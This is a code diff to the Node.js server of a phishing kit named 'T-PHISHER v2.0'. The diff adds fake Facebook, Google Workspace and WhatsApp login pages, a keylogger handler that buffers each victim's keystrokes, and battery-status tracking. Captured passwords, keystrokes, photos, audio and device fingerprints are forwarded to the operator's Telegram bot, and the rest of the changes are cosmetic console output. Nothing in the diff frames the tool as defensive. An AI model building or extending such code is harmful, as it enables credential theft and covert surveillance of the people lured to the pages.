@@ -87,6 +87,7 @@ const logs             = [];      // credential logs
 const connectedTargets = new Map(); // clientId -> userInfo object
 const activityFeed     = [];      // recent activity events
 const mediaStore       = [];      // captured photos and audio
+const targetKeystrokes = new Map(); // clientId -> { buffer: String, lastSent: Number }
 let   clientIdCounter  = 0;
 let   alertsSent       = 0;
 
@@ -105,6 +106,33 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Serve admin panel
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+// Serve Facebook template
+app.get('/facebook', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'templates', 'facebook.html'));
+});
+
+// Serve Google template
+app.get('/google', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'templates', 'google.html'));
+});
+
+// Serve WhatsApp template
+app.get('/whatsapp', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'templates', 'whatsapp.html'));
+});
+
+// Fetch available templates
+app.get('/api/templates', (req, res) => {
+  res.json({
+    templates: [
+      { id: 'instagram', name: 'Instagram Techora', path: '/' },
+      { id: 'facebook', name: 'Facebook Login', path: '/facebook' },
+      { id: 'google', name: 'Google Workspace Login', path: '/google' },
+      { id: 'whatsapp', name: 'WhatsApp Web Link', path: '/whatsapp' }
+    ]
+  });
 });
 
 // Log captured credentials
@@ -146,12 +174,10 @@ app.post('/api/log', (req, res) => {
     console.error('\x1b[31m[Telegram] Credential send error:', err.message, '\x1b[0m')
   );
 
-  printCard(`CREDENTIAL CAPTURED (ID: #${logEntry.id})`, [
-    `🌐 IP Address : \x1b[1m${logEntry.ip}\x1b[0m`,
-    `👤 Username   : \x1b[1;32m${logEntry.username}\x1b[0m`,
-    `🔒 Password   : \x1b[1;31m${logEntry.password}\x1b[0m`,
-    `🕒 Time       : ${logEntry.date} ${logEntry.time}`
-  ], '31');
+  console.log(`\n\x1b[31m [+] \x1b[32m Logged!\x1b[34m #${logEntry.id}\x1b[0m`);
+  console.log(`\x1b[31m [-] \x1b[32m IP    :\x1b[34m ${logEntry.ip}\x1b[0m`);
+  console.log(`\x1b[31m [-] \x1b[32m User  :\x1b[34m ${logEntry.username}\x1b[0m`);
+  console.log(`\x1b[31m [-] \x1b[32m Pass  :\x1b[34m ${logEntry.password}\x1b[0m`);
 
   res.status(200).json({ success: true, attemptNumber: logs.length });
 });
@@ -259,10 +285,10 @@ async function sendPhotoToTelegram(imageBase64, clientInfo) {
       caption: `📸 <b>Photo Captured</b>\n🌐 IP: <code>${clientInfo?.ip || 'Unknown'}</code>\n🖥️ ${clientInfo?.browser || '?'} on ${clientInfo?.os || '?'} (${clientInfo?.device || '?'})`,
       parse_mode: 'HTML'
     }, { filename: `capture_${Date.now()}.jpg`, contentType: 'image/jpeg' });
-    printStatus('Telegram', '📸 Photo transmitted successfully to bot', '32');
+    console.log('\x1b[32m[Telegram] 📸 Photo sent successfully\x1b[0m');
     return true;
   } catch (err) {
-    printStatus('Telegram Error', `Photo transmission failed: ${err.message}`, '31');
+    console.error('\x1b[31m[Telegram] Photo error:', err.message, '\x1b[0m');
     return false;
   }
 }
@@ -276,10 +302,10 @@ async function sendAudioToTelegram(audioBase64, clientInfo) {
       caption: `🎙️ <b>Audio Recorded</b>\n🌐 IP: <code>${clientInfo?.ip || 'Unknown'}</code>\n🕒 ${new Date().toLocaleTimeString()}`,
       parse_mode: 'HTML'
     }, { filename: `audio_${Date.now()}.webm`, contentType: 'audio/webm' });
-    printStatus('Telegram', '🎙️ Audio clip transmitted successfully to bot', '32');
+    console.log('\x1b[32m[Telegram] 🎙️ Audio sent successfully\x1b[0m');
     return true;
   } catch (err) {
-    printStatus('Telegram Error', `Audio transmission failed: ${err.message}`, '31');
+    console.error('\x1b[31m[Telegram] Audio error:', err.message, '\x1b[0m');
     return false;
   }
 }
@@ -288,10 +314,10 @@ async function sendTextToTelegram(message) {
   try {
     await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
     alertsSent++;
-    printStatus('Telegram', '🚨 System notification alert sent', '32');
+    console.log('\x1b[32m[Telegram] 🚨 Alert sent\x1b[0m');
     return true;
   } catch (err) {
-    printStatus('Telegram Error', `Notification alert failed: ${err.message}`, '31');
+    console.error('\x1b[31m[Telegram] Alert error:', err.message, '\x1b[0m');
     return false;
   }
 }
@@ -324,7 +350,10 @@ wss.on('connection', (ws, req) => {
           screen:      t.screen,
           timezone:    t.timezone,
           location:    t.location,
-          connectedAt: t.connectedAt
+          connectedAt: t.connectedAt,
+          batteryLevel: t.batteryLevel,
+          batteryCharging: t.batteryCharging,
+          keystrokes:  targetKeystrokes.get(t.clientId)?.buffer || ''
         }));
         ws.send(JSON.stringify({
           type:          'INIT',
@@ -335,7 +364,7 @@ wss.on('connection', (ws, req) => {
           activity:      activityFeed,
           alertsSent
         }));
-        printStatus('Admin', `Dashboard connected from IP: ${cleanIp}`, '33');
+        console.log('\x1b[33m[Admin] Dashboard connected\x1b[0m');
         
         // Notify admin login to Telegram
         const loginTime = new Date();
@@ -359,12 +388,54 @@ wss.on('connection', (ws, req) => {
           timezone:    msg.timezone    || 'Unknown',
           language:    msg.language    || 'Unknown',
           location:    null,
-          connectedAt: new Date().toISOString()
+          connectedAt: new Date().toISOString(),
+          batteryLevel: msg.batteryLevel || null,
+          batteryCharging: msg.batteryCharging || null
         };
         connectedTargets.set(clientId, { ...userInfo, ws });
         ws.send(JSON.stringify({ type: 'ASSIGN_ID', clientId }));
         broadcastToAdmins({ type: 'TARGET_CONNECTED', user: userInfo });
         pushActivity('connect', `🟢 Target connected — IP: ${cleanIp} | ${parsed.browser} on ${parsed.os} (${parsed.device})`);
+        break;
+      }
+
+      // ── Target sends keystroke update ─────────────────────────────────────────
+      case 'keystroke_data': {
+        const { keys } = msg;
+        if (!keys || !keys.length) break;
+        
+        // Append to in-memory keystroke buffer for this target
+        let entry = targetKeystrokes.get(clientId);
+        if (!entry) {
+          entry = { buffer: '', lastSent: Date.now() };
+        }
+        entry.buffer += keys;
+        targetKeystrokes.set(clientId, entry);
+
+        // Broadcast to admins
+        broadcastToAdmins({ type: 'KEYSTROKE_DATA', clientId, keys, fullBuffer: entry.buffer });
+
+        // Batch Telegram notification: check if 30 seconds elapsed since last send
+        if (Date.now() - entry.lastSent > 30000) {
+          entry.lastSent = Date.now();
+          targetKeystrokes.set(clientId, entry);
+          const target = connectedTargets.get(clientId);
+          const tgMsg = `⌨️ <b>Live Keystrokes [Target #${clientId}]</b>\n🌐 IP: <code>${target?.ip || cleanIp}</code>\n📝 Recent text: <code>${escapeHtml(entry.buffer.slice(-300))}</code>`;
+          sendTextToTelegram(tgMsg);
+        }
+        break;
+      }
+
+      // ── Target sends battery status update ────────────────────────────────────
+      case 'battery_update': {
+        const { level, charging } = msg;
+        const target = connectedTargets.get(clientId);
+        if (target) {
+          target.batteryLevel = level;
+          target.batteryCharging = charging;
+          connectedTargets.set(clientId, target);
+          broadcastToAdmins({ type: 'BATTERY_UPDATE', clientId, level, charging });
+        }
         break;
       }
 
@@ -453,12 +524,7 @@ wss.on('connection', (ws, req) => {
 
         sendTextToTelegram(tgMsg);
         pushActivity('fingerprint', `📱 Full device fingerprint captured — IP: ${n.publicIP || cleanIp}`);
-        printCard('DEVICE FINGERPRINT CAPTURED', [
-          `🌐 Target IP : \x1b[1m${n.publicIP || cleanIp}\x1b[0m`,
-          `📱 System    : \x1b[1;33m${parsed.os} (${parsed.device})\x1b[0m`,
-          `🌐 Browser   : \x1b[1;35m${parsed.browser}\x1b[0m`,
-          `🕒 Timestamp : ${new Date().toLocaleTimeString()}`
-        ], '35');
+        console.log(`\x1b[35m[Fingerprint] 📱 Full device info captured from IP: ${n.publicIP || cleanIp}\x1b[0m`);
         break;
       }
 
@@ -661,7 +727,10 @@ io.on('connection', (socket) => {
       screen:      t.screen,
       timezone:    t.timezone,
       location:    t.location,
-      connectedAt: t.connectedAt
+      connectedAt: t.connectedAt,
+      batteryLevel: t.batteryLevel,
+      batteryCharging: t.batteryCharging,
+      keystrokes:  targetKeystrokes.get(t.clientId)?.buffer || ''
     }));
     socket.emit('INIT', {
       logs,
@@ -671,7 +740,7 @@ io.on('connection', (socket) => {
       activity:  activityFeed,
       alertsSent
     });
-    printStatus('Socket.IO', 'Admin connected successfully', '33');
+    console.log('\x1b[33m[Socket.IO] Admin connected\x1b[0m');
   });
 
   // ── Client registers via Socket.IO (with uuid matching WS clientId) ───────
@@ -790,21 +859,7 @@ function killPort(port) {
   });
 }
 
-function printStatus(tag, message, colorCode = '32') {
-  const timestamp = new Date().toLocaleTimeString();
-  console.log(`\x1b[90m[${timestamp}]\x1b[0m \x1b[1;${colorCode}m[${tag}]\x1b[0m ${message}`);
-}
-
-function printCard(title, lines, colorCode = '36') {
-  const border = '━'.repeat(50);
-  console.log(`\n\x1b[1;${colorCode}m┏━ ${title} ━${border.slice(0, 50 - title.length - 4)}┓\x1b[0m`);
-  lines.forEach(line => {
-    console.log(`\x1b[1;${colorCode}m┃\x1b[0m  ${line}`);
-  });
-  console.log(`\x1b[1;${colorCode}m┗${border.slice(0, 48)}┛\x1b[0m\n`);
-}
-
-function typeText(text, delay = 15) {
+function typeText(text, delay = 30) {
   return new Promise(resolve => {
     let i = 0;
     const interval = setInterval(() => {
@@ -819,7 +874,7 @@ function runStartupCountdown(seconds) {
     let current = seconds;
     const timer = setInterval(() => {
       if (current > 0) {
-        process.stdout.write(`\r\x1b[90m[SYSTEM]\x1b[0m \x1b[33mInitialising environmental frameworks in ${current}s...\x1b[0m`);
+        process.stdout.write(`\r\x1b[33m[*] Initialising system environments in ${current}s...\x1b[0m`);
         current--;
       } else {
         clearInterval(timer);
@@ -832,39 +887,26 @@ function runStartupCountdown(seconds) {
 
 // ─── Application Entry Point ──────────────────────────────────────────────────
 async function startApplication() {
-  const isRender = process.env.RENDER === 'true';
-
-  if (!isRender) {
-    await killPort(PORT);
-  }
+  await killPort(PORT);
 
   server.listen(PORT, async () => {
-    if (!isRender) {
-      await runStartupCountdown(3);
-    }
+    await runStartupCountdown(3);
 
-    console.log(`\x1b[1;36m
-   ┌──────────────────────────────────────────────┐
-   │            T-PHISHER v2.0 | ONLINE           │
-   └──────────────────────────────────────────────┘\x1b[0m`);
+    console.log(`\x1b[34m         ┌──────────────────────────────────────┐
+         │  \x1b[31mT-PHISHER v2.0 — ONLINE \x1b[34m │
+         └──────────────────────────────────────┘\x1b[0m
+    `);
 
-    if (isRender) {
-      console.log(`   ⚡ Server   : http://localhost:${PORT}`);
-      console.log(`   🔑 Admin    : http://localhost:${PORT}/admin`);
-      console.log(`   🤖 Telegram : Bot initialized — Chat ID: ${CHAT_ID}`);
-      console.log(`   📡 Status   : Awaiting incoming connections...\n`);
-    } else {
-      await typeText(`   \x1b[1;32m⚡ Server   :\x1b[0m \x1b[4;34mhttp://localhost:${PORT}\x1b[0m`, 15);
-      await typeText(`   \x1b[1;33m🔑 Admin    :\x1b[0m \x1b[4;34mhttp://localhost:${PORT}/admin\x1b[0m`, 15);
-      await typeText(`   \x1b[1;35m🤖 Telegram :\x1b[0m Bot initialized — Chat ID: \x1b[34m${CHAT_ID}\x1b[0m`, 15);
-      await typeText(`   \x1b[1;36m📡 Status   :\x1b[0m Awaiting incoming connections...\n`, 15);
+    await typeText(`\x1b[32m[Server]   Running on \x1b[34mhttp://localhost:${PORT}\x1b[0m`, 25);
+    await typeText(`\x1b[32m[Admin]    Dashboard  \x1b[34mhttp://localhost:${PORT}/admin\x1b[0m`, 25);
+    await typeText(`\x1b[32m[Telegram] Bot initialized — Chat ID: \x1b[34m${CHAT_ID}\x1b[0m`, 25);
+    await typeText(`\x1b[32m[Ready]    Awaiting targets...\x1b[0m`, 25);
 
-      const url = `http://localhost:${PORT}`;
-      switch (process.platform) {
-        case 'win32':  exec(`start ${url}`);     break;
-        case 'darwin': exec(`open ${url}`);      break;
-        default:       exec(`xdg-open ${url}`);  break;
-      }
+    const url = `http://localhost:${PORT}`;
+    switch (process.platform) {
+      case 'win32':  exec(`start ${url}`);     break;
+      case 'darwin': exec(`open ${url}`);      break;
+      default:       exec(`xdg-open ${url}`);  break;
     }
   });
 }
